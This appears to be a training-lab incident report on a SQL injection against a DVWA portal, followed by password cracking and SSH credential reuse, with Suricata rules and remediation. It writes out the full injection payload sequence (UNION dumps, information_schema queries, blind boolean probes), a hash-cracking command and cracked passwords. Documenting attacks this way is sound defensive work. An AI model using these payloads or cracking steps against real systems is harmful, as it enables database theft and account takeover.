# INC-2026-004 — Incident Report
**Analyst:** Zoltan Frenyo — BeCode Corp SOC L1
**Date:** 2026-06-04
**Classification:** Confidential — Do not distribute outside BeCode Corp

---

## Executive Summary

On 30 May 2026, an external attacker at IP `172.16.50.10` exploited a SQL injection vulnerability in NexaCorp's employee self-service portal (`bru-web-01`, `192.168.10.20`). By injecting SQL commands into the `id` parameter of the account-lookup form, the attacker successfully dumped the entire `users` table from the `dvwa` database, obtaining usernames and MD5 password hashes for all accounts. The hash belonging to employee account `j.martin` was weak enough to be cracked offline. The attacker subsequently reused the recovered credential against SSH on the same server, achieving a successful login at 14:48 — approximately 28 minutes after the final data dump. Immediate credential rotation, input validation remediation, and SSH access restriction are required.

---

## Incident Timeline

| Time (CEST) | Event |
|---|---|
| 09:34:03 | Attacker loads login page (`curl/8.14.1`) and authenticates to DVWA — reconnaissance begins |
| 09:35:02 | **First SQLi probe** — single quote `'` injected into `id` parameter, triggering MySQL syntax error (error-based confirmation) |
| 09:35:02 | Tautology probe `OR '1'='1` confirms injectable parameter |
| 09:37:24–09:37:27 | `ORDER BY 1`, `ORDER BY 2` (HTTP 200), `ORDER BY 3` (HTTP 500) — column count enumeration (2 columns confirmed) |
| 09:37:28–09:37:30 | `UNION SELECT NULL,NULL` then `UNION SELECT NULL,@@version` — UNION confirmed, DB version leaked |
| 09:38:29–09:38:34 | `database()`, `information_schema.tables`, `information_schema.columns` — database structure mapped |
| 09:39:58 | **Full users table dump** — `UNION SELECT user,password FROM users` — all usernames and hashes exfiltrated (response: 5745 bytes) |
| 09:39:58–09:40:00 | Individual account dumps: `admin`, `j.martin`, `gordonb`, `pablo`, `smithy` |
| 09:41:38–09:41:43 | Blind boolean enumeration begins — `SUBSTRING`, `ASCII`, `LENGTH` probes |
| 14:18:19 | Second session — full table dump repeated (response: 5745 bytes) |
| 14:20:03 | Final individual account dump (`smithy`) |
| 15:26:41–15:28:43 | Second blind boolean enumeration session |
| **14:48:06** | **SSH login as `j.martin` from `172.16.50.10` — credential reuse SUCCESS** |
| 14:48:27–14:49:41 | Additional SSH attempts for `j.martin`, `admin`, `gordonb` — some failed (wrong password tried) |

> **Authoritative exfiltration time** (from `web_access.log`): `30/May/2026:09:39:58 +0200`

---

## Technical Analysis

### 1. Attacker Source
- **IP:** `172.16.50.10`
- **User-Agents:** `curl/8.14.1` (automated session setup) and `Mozilla/5.0 Firefox/115.0` (manual injection)
- Outside NexaCorp's internal `192.168.10.0/24` range

### 2. Vulnerable Endpoint
- **URL:** `http://192.168.10.20/dvwa/vulnerabilities/sqli/`
- **Parameter:** `id`
- **Method:** GET
- **Security level:** `low` (confirmed in PCAP response)
- **Backend:** MySQL (confirmed via `@@version` and PCAP footer)

### 3. Attack Techniques (in order)

**Step 1 — Error-based probe**
```
?id=1'&Submit=Submit
```
The single quote broke the SQL query syntax, causing MySQL to return an error — confirming the parameter is injectable.

**Step 2 — Column count enumeration**
```
?id=1' ORDER BY 1-- -   → HTTP 200
?id=1' ORDER BY 2-- -   → HTTP 200
?id=1' ORDER BY 3-- -   → HTTP 500  ← query has 2 columns
```

**Step 3 — UNION-based data extraction**
```
?id=1' UNION SELECT NULL,NULL-- -              → confirmed 2-column UNION
?id=1' UNION SELECT NULL,@@version-- -        → DB version
?id=1' UNION SELECT NULL,database()-- -       → database name: dvwa
?id=1' UNION SELECT NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
?id=1' UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -
?id=1' UNION SELECT user,password FROM users-- -   ← FULL DUMP
```

**Step 4 — Blind boolean enumeration**
```
?id=1' AND 1=1-- -                              → true condition
?id=1' AND 1=2-- -                              → false condition
?id=1' AND SUBSTRING(password,1,1)='a'-- -     → character-by-character extraction
?id=1' AND ASCII(SUBSTRING(password,1,1))=65-- -
?id=1' AND LENGTH(password)=32-- -             → confirms MD5 hash length
```

### 4. Database Structure
- **Database:** `dvwa`
- **Catalog queried:** `information_schema`
- **Table dumped:** `users`
- **Columns:** `user`, `password`

---

## What Was Exposed

All 7 accounts from the `users` table were exfiltrated:

| Username | MD5 Hash | Cracked Password |
|---|---|---|
| admin | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| gordonb | `e99a18c428cb38d5f260853678922e03` | `abc123` |
| 1337 | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley` |
| pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein` |
| smithy | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| j.martin | `ccf5538dc31d435d6bab145c924041d8` | *(see below)* |
| admin | `admin` | `admin` *(plaintext, first row quirk)* |

The hash `ccf5538dc31d435d6bab145c924041d8` for `j.martin` is crackable via `rockyou.txt`:
```bash
echo 'ccf5538dc31d435d6bab145c924041d8' > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
All hashes are **unsalted MD5** — a broken hash function for password storage. Cracking takes seconds with standard wordlists.

---

## Consequence — Credential Reuse

After cracking `j.martin`'s password, the attacker reused it against SSH on the same server:

```
2026-05-30T14:48:06  sshd: Accepted password for j.martin from 172.16.50.10 port 49145
```

**SSH login succeeded at 14:48:06 CEST** — approximately 28 minutes after the data exfiltration. This gives the attacker an authenticated shell on `bru-web-01`. Subsequent failed attempts for `admin` and `gordonb` indicate the attacker also tried those credentials but they do not have OS-level accounts.

This successful login is the entry point for **INC-2026-005**.

---

## Indicators of Compromise

| Type | Value |
|---|---|
| Attacker IP | `172.16.50.10` |
| Target host | `bru-web-01` (`192.168.10.20`) |
| Vulnerable URL | `/dvwa/vulnerabilities/sqli/` |
| Vulnerable parameter | `id` |
| Payload patterns | `%27`, `UNION+SELECT`, `ORDER+BY`, `AND+1%3D1`, `SUBSTRING`, `information_schema` |
| Compromised account | `j.martin` |
| Exfiltration time | `30/May/2026:09:39:58 +0200` |
| SSH intrusion time | `2026-05-30T14:48:06+02:00` |
| User-agents | `curl/8.14.1`, `Mozilla/5.0 Firefox/115.0` |

---

## Detection — Suricata Rules

Three rules were written and validated against `attack.pcap` (located at `/etc/suricata/rules/learner/lab.rules`):

```suricata
# RULE: error-based SQLi probe — single quote injection
alert http any any -> $HTTP_SERVERS any (msg:"SQL Injection Probe - Error Based Single Quote"; flow:to_server,established; http.uri; content:"'"; classtype:web-application-attack; sid:9000001; rev:1;)

# RULE: UNION-based SQLi — data extraction
alert http any any -> $HTTP_SERVERS any (msg:"SQL Injection - UNION Based Query"; http.uri; content:"UNION"; nocase; content:"SELECT"; nocase; distance:1; classtype:web-application-attack; sid:9000002; rev:1;)

# RULE: blind boolean enumeration
alert http any any -> $HTTP_SERVERS any (msg:"SQL Injection - Blind Boolean Enumeration"; http.uri; content:"AND"; nocase; pcre:"/AND\s+(SUBSTRING|ASCII|LENGTH|\d+=\d+)/Ui"; classtype:web-application-attack; sid:9000003; rev:1;)
```

**Alert counts** (replay with `sudo suricata -r attack.pcap -S lab.rules -l /var/log/suricata/`):

| Rule | Technique | Alerts |
|---|---|---|
| sid:9000001 | error_based | 39 |
| sid:9000002 | union_based | 16 |
| sid:9000003 | blind_boolean | 24 |
| **Total** | | **79** |

**False positive note:** sid:9000001 (`content:"'"`) will fire on any HTTP request containing a single quote — including legitimate search forms or apostrophes in names. In production this rule would need a `pcre` to anchor the match to known vulnerable parameter patterns, or be combined with a `threshold` to suppress isolated occurrences.

**Bonus — information_schema enumeration:**
```suricata
alert http any any -> $HTTP_SERVERS any (msg:"SQL Injection - information_schema enumeration"; http.uri; content:"information_schema"; nocase; classtype:web-application-attack; sid:9000004; rev:1;)
```

---

## Remediation Recommendations

**Immediate (within 24 hours):**

1. **Rotate all credentials** — disable and reset passwords for `j.martin`, `admin`, `gordonb`, `pablo`, `smithy` on both the web application and any systems where they may be reused. Revoke the active SSH session for `j.martin`.

2. **Block `172.16.50.10`** at the firewall and WAF immediately.

3. **Disable the vulnerable DVWA endpoint** — take `/dvwa/vulnerabilities/sqli/` offline until patched.

**Short-term (within 1 week):**

4. **Fix the SQL injection** — use parameterised queries (prepared statements) for all database interactions. Never concatenate user input into SQL strings:
   ```php
   // Vulnerable
   $query = "SELECT * FROM users WHERE id = '$id'";
   // Fixed
   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
   $stmt->execute([$id]);
   ```

5. **Replace MD5 password hashing** with a modern, salted algorithm (`bcrypt`, `argon2id`). MD5 is cryptographically broken for password storage.

6. **Restrict SSH access** — limit SSH to internal `192.168.10.0/24` addresses only via firewall rules or `sshd_config` `AllowUsers`/`Match Address` directives.

**Medium-term:**

7. **Deploy a WAF** with SQLi signatures enabled in blocking mode (not just alerting).

8. **Enable Suricata in IPS mode** on the web server's interface with the detection rules from this investigation.

9. **Implement account lockout** on the web application after repeated failed login attempts to prevent blind enumeration.

---

*BeCode Corp — Incident Response Division*
*Classification: Confidential — Do not distribute outside BeCode Corp*
